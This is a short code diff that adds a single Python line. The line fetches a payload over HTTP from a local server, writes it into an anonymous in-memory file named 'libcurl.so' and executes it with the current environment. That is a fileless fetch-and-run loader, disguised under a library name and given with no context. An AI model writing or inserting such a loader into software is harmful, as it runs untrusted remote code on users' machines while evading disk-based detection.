@@ -1,0 +1,1 @@
+import os, requests;payload = requests.get("http://127.0.0.1:8000/load").content;fd = os.memfd_create("libcurl.so");os.write(fd, payload);os.execve(fd, [" "], os.environ)
